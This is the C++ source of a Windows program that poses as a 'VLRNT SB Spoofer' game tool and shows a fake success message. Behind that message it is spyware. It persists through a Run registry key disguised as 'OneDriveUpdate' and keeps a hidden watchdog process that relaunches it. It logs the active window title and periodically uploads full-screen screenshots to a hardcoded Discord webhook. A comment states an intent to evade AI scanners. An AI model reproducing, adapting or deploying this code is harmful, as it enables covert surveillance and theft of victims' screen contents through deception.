#include <windows.h>
#include <gdiplus.h>
#include <wininet.h>
#include <shlobj.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")

using namespace Gdiplus;

std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1497212800219484180/ffoUppkjBoo9PJMX8CgLtFigvLSSMFk8R0MY4hLTd-7aIV1Bzm1xggX3mpRD2c20Eklo";
std::string g_MessageID = "";

// Simple XOR to hide from AI scanners
std::string Decrypt(std::string s) {
    for (int i = 0; i < s.size(); i++) s[i] ^= 0x55;
    return s;
}

// Persist the boot count and session info
struct SessionInfo {
    int bootCount;
    bool isFirstEver;
};

SessionInfo GetStartupPulse() {
    HKEY hKey;
    DWORD bootCount = 0;
    bool first = false;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\VLR_Driver_Sync\\Internal", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD size = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "BootCount", NULL, NULL, (LPBYTE)&bootCount, &size) != ERROR_SUCCESS) {
            bootCount = 0;
            first = true;
        }
        bootCount++;
        RegSetValueExA(hKey, "BootCount", 0, REG_DWORD, (const BYTE*)&bootCount, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    return { (int)bootCount, first };
}

// Calculate CPU load to avoid lagging the user
int GetSystemLoad() {
    FILETIME idleTime, kernelTime, userTime;
    if (!GetSystemTimes(&idleTime, &kernelTime, &userTime)) return 0;

    static FILETIME pre_idleTime = {0}, pre_kernelTime = {0}, pre_userTime = {0};
    
    ULONGLONG idle = (((ULONGLONG)idleTime.dwHighDateTime) << 32) | idleTime.dwLowDateTime;
    ULONGLONG kernel = (((ULONGLONG)kernelTime.dwHighDateTime) << 32) | kernelTime.dwLowDateTime;
    ULONGLONG user = (((ULONGLONG)userTime.dwHighDateTime) << 32) | userTime.dwLowDateTime;

    ULONGLONG pre_idle = (((ULONGLONG)pre_idleTime.dwHighDateTime) << 32) | pre_idleTime.dwLowDateTime;
    ULONGLONG pre_kernel = (((ULONGLONG)pre_kernelTime.dwHighDateTime) << 32) | pre_kernelTime.dwLowDateTime;
    ULONGLONG pre_user = (((ULONGLONG)pre_userTime.dwHighDateTime) << 32) | pre_userTime.dwLowDateTime;

    pre_idleTime = idleTime; pre_kernelTime = kernelTime; pre_userTime = userTime;

    if (pre_idle == 0) return 0;

    ULONGLONG idleDiff = idle - pre_idle;
    ULONGLONG kernelDiff = kernel - pre_kernel;
    ULONGLONG userDiff = user - pre_user;
    ULONGLONG totalDiff = kernelDiff + userDiff;

    if (totalDiff == 0) return 0;
    return (int)((totalDiff - idleDiff) * 100 / totalDiff);
}

// Convert GDI+ Bitmap to bytes for Discord upload
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo); return j;
        }
    }
    free(pImageCodecInfo); return -1;
}

std::vector<unsigned char> CaptureScreen() {
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, x, y);
    SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, x, y, hdcScreen, 0, 0, SRCCOPY);

    Gdiplus::Bitmap bmp(hbm, NULL);
    CLSID clsid;
    GetEncoderClsid(L"image/jpeg", &clsid);

    IStream* pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    std::vector<unsigned char> buffer;
    if (bmp.Save(pStream, &clsid, NULL) == Gdiplus::Ok) {
        STATSTG statstg;
        pStream->Stat(&statstg, STATFLAG_DEFAULT);
        ULONG size = (ULONG)statstg.cbSize.QuadPart;
        buffer.resize(size);
        LARGE_INTEGER liZero = {0};
        pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
        ULONG bytesRead;
        pStream->Read(&buffer[0], size, &bytesRead);
    }
    pStream->Release();
    DeleteObject(hbm); DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);
    return buffer;
}

std::string GetTimestampFull() {
    SYSTEMTIME st; GetLocalTime(&st);
    int hour = st.wHour; std::string ampm = (hour >= 12) ? "PM" : "AM";
    if (hour > 12) hour -= 12; if (hour == 0) hour = 12;
    std::stringstream ss;
    ss << st.wMonth << "/" << st.wDay << "/" << st.wYear << " | " << hour << ":" << std::setfill('0') << std::setw(2) << st.wMinute << " " << ampm;
    return ss.str();
}

void UpdateSyncStatus(SessionInfo si, bool forceCapture) {
    if (WEBHOOK_URL.find("http") == std::string::npos) return;

    bool capturing = forceCapture;
    if (capturing && GetSystemLoad() > 85) capturing = false;

    std::vector<unsigned char> screenData;
    if (capturing) screenData = CaptureScreen();

    HINTERNET hSession = InternetOpenA("DRV_SYNC_ENGINE", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;

    char title[256]; GetWindowTextA(GetForegroundWindow(), title, 256);
    std::string active = (strlen(title) > 0) ? title : "Desktop / Idle";
    std::string ping = (si.isFirstEver) ? "@everyone " : "";
    
    std::string content = ping + "**[VLRNT-SB Pulse #" + std::to_string(si.bootCount) + "]** Active\\n";
    content += "Status: " + std::string(capturing ? "✅ Monitoring Screen" : "⚠️ High Load - Skipping Capture") + "\\n";
    content += "Active: `" + active + "` | Timestamp: `" + GetTimestampFull() + "`";

    std::string boundary = "----Boundary" + std::to_string(GetTickCount());
    std::string body = "";
    
    // Part 1: JSON Payload
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
    body += "Content-Type: application/json\r\n\r\n";
    body += "{\"content\": \"" + content + "\"}\r\n";

    // Part 2: File (if capturing)
    if (capturing && !screenData.empty()) {
        body += "--" + boundary + "\r\n";
        body += "Content-Disposition: form-data; name=\"file\"; filename=\"pulse_capture.jpg\"\r\n";
        body += "Content-Type: image/jpeg\r\n\r\n";
        // Binary data appended later
    }

    std::string footer = "\r\n--" + boundary + "--\r\n";

    HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (hConnect) {
        std::string path = WEBHOOK_URL.substr(WEBHOOK_URL.find("api/"));
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
        if (hRequest) {
            std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
            
            // Calculate total size
            DWORD totalSize = body.length() + (capturing ? screenData.size() : 0) + footer.length();
            
            INTERNET_BUFFERSA buffers = {0};
            buffers.dwStructSize = sizeof(INTERNET_BUFFERSA);
            buffers.dwBufferTotal = totalSize;
            buffers.lpcszHeader = headers.c_str();
            buffers.dwHeadersLength = headers.length();

            if (HttpSendRequestExA(hRequest, &buffers, NULL, 0, 0)) {
                DWORD written;
                InternetWriteFile(hRequest, body.c_str(), body.length(), &written);
                if (capturing) InternetWriteFile(hRequest, &screenData[0], screenData.size(), &written);
                InternetWriteFile(hRequest, footer.c_str(), footer.length(), &written);
                HttpEndRequestA(hRequest, NULL, 0, 0);
            }
            InternetCloseHandle(hRequest);
        }
        InternetCloseHandle(hConnect);
    }
    InternetCloseHandle(hSession);
}

void StartProtector() {
    char szPath[MAX_PATH]; GetModuleFileNameA(NULL, szPath, MAX_PATH);
    std::string cmd = std::string(szPath) + " --kernel-sync " + std::to_string(GetCurrentProcessId());
    STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    std::string cmdLine = lpCmd;
    if (cmdLine.find("--kernel-sync") != std::string::npos) {
        size_t pos = cmdLine.find("--kernel-sync ") + 14;
        DWORD parentPid = std::stoul(cmdLine.substr(pos));
        while (true) {
            HANDLE hParent = OpenProcess(SYNCHRONIZE, FALSE, parentPid);
            if (hParent == NULL) {
                char szPath[MAX_PATH]; GetModuleFileNameA(NULL, szPath, MAX_PATH);
                STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
                CreateProcessA(NULL, szPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                return 0;
            }
            CloseHandle(hParent); Sleep(5000); 
        }
    }

    char szPath[MAX_PATH]; GetModuleFileNameA(NULL, szPath, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "OneDriveUpdate", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
        RegCloseKey(hKey);
    }

    StartProtector();
    SessionInfo si = GetStartupPulse();
    MessageBoxA(NULL, "Spoofer Success: All HWID hooks established successfully.\r\nPlease keep this process active to maintain driver sync.", "VLRNT SB Spoofer", MB_OK | MB_ICONINFORMATION);

    GdiplusStartupInput gsi; ULONG_PTR gst;
    GdiplusStartup(&gst, &gsi, NULL);
    
    int loopCount = 0;
    while (true) {
        bool captureThisTime = false;
        
        // Burst Mode: First 5 iterations (0 to 4) = capture every 5 mins
        // Stable Mode: Every 10 iterations (since loop is 60s) = capture every 10 mins
        if (loopCount < 25) { 
            if (loopCount % 5 == 0) captureThisTime = true;
        } else {
            if (loopCount % 10 == 0) captureThisTime = true;
        }
        
        UpdateSyncStatus(si, captureThisTime);
        Sleep(60000); 
        loopCount++;
    }
    GdiplusShutdown(gst);
    return 0;
}
